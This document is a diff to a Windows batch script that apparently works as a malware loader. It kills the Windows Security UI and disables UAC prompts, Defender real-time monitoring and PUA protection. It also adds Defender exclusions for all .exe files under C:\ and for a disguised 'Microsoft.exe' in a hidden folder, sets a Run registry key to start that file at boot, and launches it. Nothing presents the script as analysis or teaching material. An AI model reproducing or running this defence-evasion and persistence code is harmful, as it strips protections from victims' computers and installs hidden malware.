@@ -28,6 +28,8 @@ mkdir "%hiddenFolder2%"
 REM Set hidden attribute for folder
 rem attrib +h +s "%hiddenFolder2%"
 
+cd "%hiddenFolder2%"
+
 ::external
 taskkill /f /im SecHealthUI.exe >nul 2>&1
 reg add "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f >nul
@@ -103,15 +105,11 @@ REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\S
 REM Disable the UAC consent prompt for the built-in Administrator account
 REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 
-powershell Set-MpPreference -DisableTamperProtection $true
 powershell Set-MpPreference -DisableRealtimeMonitoring $true
 powershell Set-MpPreference -PUAProtection 0
 powershell Set-MpPreference -SubmitSamplesConsent 1
 powershell Set-ExecutionPolicy -ExecutionPolicy RemoteSigned
-powershell Set-MpPreference -EnableSmartScreen CheckApps
-powershell Set-MpPreference -QuickScanEnabled 0
 powershell Add-MpPreference -ExclusionPath 'C:\*.exe'
-powershell Set-MpPreference -ControlledFolderAccess Disabled
 
 REM Exclude hidden folder from Windows Defender
 powershell -Command "Add-MpPreference -ExclusionPath '%hiddenFolder2%\Microsoft.exe'"
@@ -125,6 +123,6 @@ rem attrib +h +s "%hiddenFolder2%\Microsoft.exe"
 REM Add registry key to start Microsoft.exe on boot
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft" /t REG_SZ /d "%hiddenFolder2%\Microsoft.exe" /f
 
-start /B "" "%hiddenFolder2%\Microsoft.exe"
+start /B Microsoft.exe"
 
 goto :eof
